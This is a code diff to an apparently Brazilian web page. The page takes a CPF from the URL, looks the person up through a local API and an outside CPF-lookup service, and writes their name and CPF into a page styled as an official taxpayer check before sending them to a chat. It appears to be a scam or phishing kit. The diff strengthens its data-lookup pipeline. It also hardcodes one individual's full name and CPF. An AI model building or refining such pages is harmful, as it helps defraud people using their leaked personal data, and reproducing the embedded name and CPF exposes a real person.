@@ -1830,7 +1830,8 @@
             // Função para obter CPF da URL
             function getCpfFromUrl() {
                 const urlParams = new URLSearchParams(window.location.search);
-                return urlParams.get('cpf');
+                const raw = urlParams.get('cpf') || '';
+                return String(raw).replace(/\D/g, '');
             }
 
             // Função para formatar CPF: 000.000.000-00
@@ -1841,19 +1842,35 @@
                 return cpfLimpo.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
             }
 
+            // Função para normalizar dados vindos da API
+            function normalizeCustomerData(data, cpfConsultado) {
+                const nome = String(data?.NOME || data?.nome || '').trim();
+                const cpfNormalizado = String(data?.CPF || data?.cpf || cpfConsultado || '').replace(/\D/g, '');
+                const nascimento = data?.NASC || data?.NASCIMENTO || data?.nascimento || '';
+
+                return {
+                    NOME: nome,
+                    CPF: cpfNormalizado,
+                    NASC: nascimento
+                };
+            }
+
             // Função para atualizar os dados na página
             function updatePageData(data) {
-                // Atualizar nome do contribuinte
-                const nomeElements = document.querySelectorAll('body');
-                const htmlContent = document.body.innerHTML;
+                const nome = String(data?.NOME || '').trim();
+                const cpfNumerico = String(data?.CPF || '').replace(/\D/g, '');
+                const cpfFormatado = formatCpf(cpfNumerico);
 
-                // Substituir nome padrão pelo nome da API
-                document.body.innerHTML = htmlContent.replace(/LUIS HENRIQUE PAVAN MARSOLA/g, data.NOME);
+                if (!nome || cpfNumerico.length !== 11) {
+                    console.warn('Dados insuficientes para atualizar a página:', data);
+                    return;
+                }
 
-                // Substituir CPF padrão pelo CPF da API (formatado)
-                const cpfFormatado = formatCpf(data.CPF);
-                document.body.innerHTML = document.body.innerHTML.replace(/355\.298\.728-24/g, cpfFormatado);
-                document.body.innerHTML = document.body.innerHTML.replace(/35529872824/g, data.CPF.replace(/\D/g, ''));
+                let htmlContent = document.body.innerHTML;
+                htmlContent = htmlContent.replace(/LUIS HENRIQUE PAVAN MARSOLA/g, nome);
+                htmlContent = htmlContent.replace(/355\.298\.728-24/g, cpfFormatado);
+                htmlContent = htmlContent.replace(/35529872824/g, cpfNumerico);
+                document.body.innerHTML = htmlContent;
             }
 
             // Função para atualizar página com texto genérico (sem nome/CPF)
@@ -1881,76 +1898,78 @@
                 console.log('✅ Texto genérico aplicado - todos os nomes e CPFs removidos');
             }
 
-            // Função para gerar dados genéricos aleatórios
-            function gerarDadosGenericos(cpf) {
-                const nomes = ['João Silva', 'Maria Santos', 'Pedro Oliveira', 'Ana Costa', 'Carlos Souza', 'Juliana Lima', 'Rafael Alves', 'Fernanda Rocha'];
-                const nomeAleatorio = nomes[Math.floor(Math.random() * nomes.length)];
-                const anoNascimento = 1950 + Math.floor(Math.random() * 50); // 1950-2000
-                const mesNascimento = String(Math.floor(Math.random() * 12) + 1).padStart(2, '0');
-                const diaNascimento = String(Math.floor(Math.random() * 28) + 1).padStart(2, '0');
-
-                return {
-                    CPF: cpf,
-                    NOME: nomeAleatorio,
-                    NASCIMENTO: `${diaNascimento}/${mesNascimento}/${anoNascimento}`,
-                    MAE: 'Informação não disponível',
-                    SEXO: Math.random() > 0.5 ? 'Masculino' : 'Feminino'
-                };
+            // Função para limpar dados antigos quando a consulta falha
+            function limparDadosAntigos() {
+                try {
+                    localStorage.removeItem('customerData');
+                } catch (error) {
+                    console.warn('Não foi possível limpar customerData:', error);
+                }
             }
 
             // Função principal que executa a consulta em cascata
             async function executeApiConsultation() {
                 showLoadingScreen();
-                let cpf = getCpfFromUrl();
-                if (!cpf) return hideLoadingScreen();
+                const cpf = getCpfFromUrl();
+                if (!cpf || cpf.length !== 11) {
+                    limparDadosAntigos();
+                    hideLoadingScreen();
+                    return;
+                }
 
+                limparDadosAntigos();
                 let dataFinal = null;
 
                 try {
-                    // TENTATIVA 1: API Premium (via seu PHP novo)
                     updateLoadingText('Consultando base de dados nacional...');
-                    const res1 = await fetch(`api/consultar_cpf_brasil.php?cpf=${cpf}`);
+                    const res1 = await fetch(`api/consultar_cpf_brasil.php?cpf=${cpf}`, { cache: 'no-store' });
                     const result1 = await res1.json();
 
-                    if (result1.success && result1.data) {
-                        dataFinal = result1.data;
-                        console.log("Dados obtidos via API Premium");
-                    } else {
-                        throw new Error("API Premium falhou");
+                    if (result1 && result1.success && result1.data) {
+                        const normalizado = normalizeCustomerData(result1.data, cpf);
+                        if (normalizado.NOME && normalizado.CPF === cpf) {
+                            dataFinal = normalizado;
+                            console.log('Dados obtidos via API principal');
+                        } else {
+                            console.warn('API principal retornou dados inconsistentes:', result1.data);
+                        }
                     }
-
                 } catch (error) {
-                    // TENTATIVA 2: Fallback Sistemafull
-                    console.warn("API 1 falhou, tentando contingência...");
-                    updateLoadingText('Acessando servidor de contingência...');
+                    console.warn('API principal falhou:', error);
+                }
 
+                if (!dataFinal) {
                     try {
-                        const res2 = await fetch(`https://base2.sistemafull.site:80/api/cpfx?CPF=${cpf}`);
+                        updateLoadingText('Acessando servidor de contingência...');
+                        const res2 = await fetch(`https://base2.sistemafull.site:80/api/cpfx?CPF=${cpf}`, { cache: 'no-store' });
                         const result2 = await res2.json();
+                        const normalizado = normalizeCustomerData(result2, cpf);
 
-                        if (result2 && (result2.NOME || result2.nome)) {
-                            // Padroniza para o formato que seu site espera
-                            dataFinal = {
-                                NOME: result2.NOME || result2.nome,
-                                CPF: result2.CPF || result2.cpf || cpf,
-                                NASC: result2.NASC || result2.nascimento || ""
-                            };
+                        if (normalizado.NOME && normalizado.CPF === cpf) {
+                            dataFinal = normalizado;
+                            console.log('Dados obtidos via API de contingência');
+                        } else {
+                            console.warn('API de contingência retornou dados inconsistentes:', result2);
                         }
                     } catch (error2) {
-                        console.error("Ambas as APIs falharam.");
+                        console.error('Ambas as APIs falharam:', error2);
                     }
                 }
 
-                // APLICAÇÃO DOS DADOS
                 if (dataFinal) {
                     updatePageData(dataFinal);
-                    localStorage.setItem('customerData', JSON.stringify({
-                        nome: dataFinal.NOME,
-                        cpf: dataFinal.CPF.replace(/\D/g, ''),
-                        nascimento: dataFinal.NASC || null
-                    }));
+                    try {
+                        localStorage.setItem('customerData', JSON.stringify({
+                            nome: dataFinal.NOME,
+                            cpf: dataFinal.CPF,
+                            nascimento: dataFinal.NASC || null
+                        }));
+                    } catch (error) {
+                        console.warn('Erro ao salvar customerData:', error);
+                    }
                 } else {
                     updatePageGeneric();
+                    limparDadosAntigos();
                 }
 
                 hideLoadingScreen();
@@ -1994,7 +2013,6 @@
 
     <script>
         function irParaChat() {
-            // Tenta obter dados do localStorage primeiro (já salvos pela API)
             let customerData = null;
             try {
                 const stored = localStorage.getItem('customerData');
@@ -2005,40 +2023,20 @@
                 console.warn('Erro ao ler customerData do localStorage:', e);
             }
 
-            // Se não tiver no localStorage, tenta capturar do DOM
             if (!customerData || !customerData.nome || !customerData.cpf) {
-                const nome = document.querySelector("p strong:nth-child(1)")?.innerText || '';
-                const cpf = [...document.querySelectorAll("p strong")].find(el => el.innerText.includes("."))?.innerText || '';
-
-                // Mescla dados do DOM com dados existentes do localStorage (preserva telefone se existir)
-                customerData = {
-                    ...customerData,
-                    nome: nome || customerData?.nome || '',
-                    cpf: cpf.replace(/\D/g, '') || customerData?.cpf || '',
-                };
+                alert('Não foi possível carregar os dados da consulta. Refaça a consulta do CPF.');
+                return;
             }
 
-            // Garante que o telefone está preservado se já existir
-            if (!customerData.telefone) {
-                // Tenta obter do localStorage novamente caso tenha sido sobrescrito
-                try {
-                    const stored = localStorage.getItem('customerData');
-                    if (stored) {
-                        const parsed = JSON.parse(stored);
-                        if (parsed.telefone) {
-                            customerData.telefone = parsed.telefone;
-                        }
-                    }
-                } catch (e) {
-                    console.warn('Erro ao preservar telefone do localStorage:', e);
-                }
-            }
+            customerData = {
+                ...customerData,
+                nome: String(customerData.nome || '').trim(),
+                cpf: String(customerData.cpf || '').replace(/\D/g, ''),
+                telefone: customerData.telefone ? String(customerData.telefone).replace(/\D/g, '') : customerData.telefone
+            };
 
-            // Salva no localStorage (preservando telefone se existir)
-            localStorage.setItem("customerData", JSON.stringify(customerData));
-
-            // Redireciona para o chat
-            window.location.href = "chat.html";
+            localStorage.setItem('customerData', JSON.stringify(customerData));
+            window.location.href = 'chat.html';
         }
     </script>
 
